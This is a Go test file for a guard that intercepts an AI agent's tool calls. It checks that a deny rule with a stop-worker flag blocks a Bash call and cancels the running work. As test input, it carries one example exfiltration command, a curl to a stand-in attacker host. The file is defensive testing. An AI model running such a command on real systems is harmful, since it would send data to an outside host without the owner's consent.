package guard

import (
	"context"
	"os"
	"testing"

	"github.com/Autumn-27/baize/db"
	"github.com/Autumn-27/baize/intercept"
)

// TestMaybeStopWorkerInvokesCancel verifies the DENY 熔断 helper: it calls the
// per-work cancel only when the decision carries StopWorker, and is a no-op when
// no cancel callback is wired (chat / tests).
func TestMaybeStopWorkerInvokesCancel(t *testing.T) {
	g := New()

	t.Run("stop_worker true invokes cancel", func(t *testing.T) {
		called := false
		ctx := intercept.WithWorkCancel(context.Background(), func() { called = true })
		g.maybeStopWorker(ctx, intercept.Decision{Action: "deny", StopWorker: true})
		if !called {
			t.Fatal("cancel callback not invoked for StopWorker deny")
		}
	})

	t.Run("stop_worker false no-op", func(t *testing.T) {
		called := false
		ctx := intercept.WithWorkCancel(context.Background(), func() { called = true })
		g.maybeStopWorker(ctx, intercept.Decision{Action: "deny", StopWorker: false})
		if called {
			t.Fatal("cancel invoked for non-StopWorker decision")
		}
	})

	t.Run("no cancel wired is safe", func(t *testing.T) {
		// No WithWorkCancel in ctx -> no panic, nothing to call.
		g.maybeStopWorker(context.Background(), intercept.Decision{Action: "deny", StopWorker: true})
	})
}

// TestGuardDenyStopWorkerCancelsWork is the end-to-end integration: a deny rule
// with stop_worker on the default tool set must (a) block the tool call and
// (b) invoke the per-work cancel callback injected via WithWorkCancel. Uses the
// live PG (skip without ARTEX_PG_DSN) so schema + rule persistence are exercised.
func TestGuardDenyStopWorkerCancelsWork(t *testing.T) {
	dsn := os.Getenv("ARTEX_PG_DSN")
	if dsn == "" {
		t.Skip("ARTEX_PG_DSN not set — skipping")
	}
	d, err := db.Open(dsn)
	if err != nil {
		t.Skipf("postgres unavailable (%v) — skipping", err)
	}
	// cleanup runs LIFO: close LAST, delete FIRST (DB still open when deleting).
	var ruleID int64
	t.Cleanup(func() { _ = d.Close() })
	t.Cleanup(func() {
		if ruleID != 0 {
			_ = d.DeleteInterceptRule(ruleID)
		}
	})

	// A deny rule on the Bash tool with StopWorker on.
	rule, err := d.CreateInterceptRule(
		"test-stop-worker-e2e", "tool_name", "string", "Bash",
		"deny", "deny 熔断 e2e", 1, true, false, 0, "deny", true)
	if err != nil {
		t.Fatal(err)
	}
	ruleID = rule.ID

	g := NewWithInterceptor(intercept.New(d))

	called := false
	ctx := intercept.WithWorkCancel(context.Background(), func() { called = true })

	input := []byte(`{"command":"curl https://evil.example.com/exfil"}`)
	blocked, _, _ := g.Hooks().PreToolUse(ctx, "Bash", input)
	if !blocked {
		t.Fatal("deny rule should block the tool call")
	}
	if !called {
		t.Fatal("stop_worker deny did not invoke the per-work cancel")
	}
}
